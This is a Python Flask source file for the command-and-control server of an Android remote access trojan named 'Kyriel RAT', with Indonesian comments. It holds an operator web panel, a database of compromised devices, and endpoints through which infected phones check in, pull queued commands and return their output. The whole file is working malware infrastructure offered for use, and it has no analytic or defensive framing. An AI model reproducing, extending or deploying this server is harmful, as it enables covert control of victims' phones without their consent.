#!/usr/bin/env python3
"""
Kyriel RAT C2 Server
Control panel + API untuk Android RAT
Run: python3 server.py
"""

from flask import Flask, request, jsonify, render_template_string
import sqlite3
import datetime
import threading
import time

app = Flask(__name__)
DB_NAME = 'kyriel_rat.db'

# ── Database ───────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id TEXT PRIMARY KEY, model TEXT, android TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, output TEXT, timestamp TEXT, status TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ── Panel HTML ─────────────────────────────────────────
PANEL = '''
<!DOCTYPE html>
<html>
<head>
    <title>Kyriel RAT Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; color: #c0c0d0; font-family: monospace; padding: 20px; }
        h1 { color: #00ff88; margin-bottom: 10px; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 24px; }
        .header p { color: #666; font-size: 13px; }
        .device-card {
            background: #111118; border: 1px solid #1a1a2e; border-radius: 8px;
            padding: 20px; margin: 15px 0;
        }
        .device-card h3 { color: #00ff88; margin-bottom: 10px; }
        .device-info { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 8px; margin-bottom: 15px; font-size: 13px; }
        .device-info div { background: #0a0a0f; padding: 8px; border-radius: 4px; }
        .device-info span { color: #00ff88; font-weight: bold; }
        .cmd-row { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
        .cmd-input {
            flex: 1; min-width: 200px; padding: 10px;
            background: #0a0a0f; border: 1px solid #1a1a2e;
            color: #00ff88; border-radius: 4px; font-family: monospace; outline: none;
        }
        .cmd-input:focus { border-color: #00ff88; }
        button {
            padding: 10px 16px; background: #00ff88; color: #0a0a0f;
            border: none; border-radius: 4px; cursor: pointer; font-weight: bold;
        }
        button:hover { background: #00cc6a; }
        .status-online { color: #00ff88; }
        .status-offline { color: #ff4444; }
        .output-box {
            background: #050508; padding: 10px; margin-top: 10px;
            border-radius: 4px; font-size: 12px; white-space: pre-wrap;
            max-height: 200px; overflow-y: auto; color: #00ff88;
        }
        .footer { text-align: center; margin-top: 30px; color: #555; font-size: 11px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ Kyriel RAT Panel</h1>
        <p>Android Device Control Center</p>
    </div>
    <div id="devices-container"></div>
    <div class="footer">Kyriel RAT v1.0 • C2 Server</div>

    <script>
        async function refreshDevices() {
            try {
                const res = await fetch('/api/devices');
                const devices = await res.json();
                let html = '';
                for (const d of devices) {
                    const statusClass = d.status === 'online' ? 'status-online' : 'status-offline';
                    html += `<div class="device-card">
                        <h3>${d.model || 'Unknown Device'} <span class="${statusClass}">[${d.status}]</span></h3>
                        <div class="device-info">
                            <div>ID: <span>${d.id}</span></div>
                            <div>Android: <span>${d.android || 'N/A'}</span></div>
                            <div>Last Seen: <span>${d.last_seen || 'Never'}</span></div>
                        </div>
                        <div class="cmd-row">
                            <input type="text" class="cmd-input" id="cmd-${d.id}" placeholder="Command: restart / info">
                            <button onclick="sendCmd('${d.id}')">Kirim</button>
                            <button onclick="sendCmd('${d.id}', 'restart')">Restart HP</button>
                        </div>
                        <div class="output-box" id="output-${d.id}">Output command akan muncul di sini...</div>
                    </div>`;
                }
                if (!html) html = '<p style="text-align:center;color:#666">Tidak ada device terhubung.</p>';
                document.getElementById('devices-container').innerHTML = html;
            } catch (e) {
                document.getElementById('devices-container').innerHTML = '<p style="color:#ff4444">Gagal refresh</p>';
            }
        }

        async function sendCmd(deviceId, preset) {
            let input = document.getElementById('cmd-' + deviceId);
            let command = preset || input.value.trim();
            if (!command) return alert('Isi command dulu');
            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: deviceId, command: command })
                });
                alert('Command dikirim. Tunggu device checkin.');
                input.value = '';
            } catch (e) {
                alert('Gagal kirim command');
            }
        }

        setInterval(refreshDevices, 3000);
        refreshDevices();
    </script>
</body>
</html>
'''

# ── Routes ─────────────────────────────────────────────
@app.route('/')
def panel():
    return PANEL

@app.route('/api/devices')
def get_devices():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    return jsonify([{'id': r[0], 'model': r[1], 'android': r[2], 'last_seen': r[3], 'status': r[4]} for r in rows])

@app.route('/api/send', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    if not device_id or not command:
        return jsonify({'success': False, 'error': 'device_id dan command wajib'}), 400
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO commands (device_id, command, timestamp, status) VALUES (?,?,?,?)",
              (device_id, command, datetime.datetime.now().isoformat(), 'pending'))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

# ── Device check-in ────────────────────────────────────
@app.route('/api/checkin', methods=['POST'])
def checkin():
    data = request.json
    device_id = data.get('id')
    model = data.get('model', 'Unknown')
    android = data.get('android', 'Unknown')
    
    if not device_id:
        return jsonify({'success': False, 'error': 'id wajib'}), 400
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO devices (id, model, android, last_seen, status) VALUES (?,?,?,?,?)",
              (device_id, model, android, datetime.datetime.now().isoformat(), 'online'))
    conn.commit()
    
    c.execute("SELECT id, command FROM commands WHERE device_id=? AND status='pending'", (device_id,))
    pending = c.fetchall()
    conn.close()
    
    commands = [{'id': p[0], 'command': p[1]} for p in pending]
    return jsonify({'commands': commands})

# ── Receive command result ─────────────────────────────
@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    command_id = data.get('id')
    output = data.get('output', '')
    
    if not command_id:
        return jsonify({'success': False, 'error': 'id wajib'}), 400
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE commands SET output=?, status='done' WHERE id=?", (output, command_id))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

# ── Mark device offline jika tidak check-in dalam 10 detik ──
def mark_offline_devices():
    while True:
        time.sleep(10)
        try:
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("UPDATE devices SET status='offline' WHERE last_seen < datetime('now', '-10 seconds')")
            conn.commit()
            conn.close()
        except Exception as e:
            print('Offline check error:', e)

# ── Run ────────────────────────────────────────────────
if __name__ == '__main__':
    # Jalankan thread penanda offline
    t = threading.Thread(target=mark_offline_devices, daemon=True)
    t.start()
    
    print('═══════════════════════════════════')
    print('  ⚡ Kyriel RAT C2 Server')
    print('  Panel: http://0.0.0.0:5000')
    print('═══════════════════════════════════')
    app.run(host='0.0.0.0', port=5000, debug=False)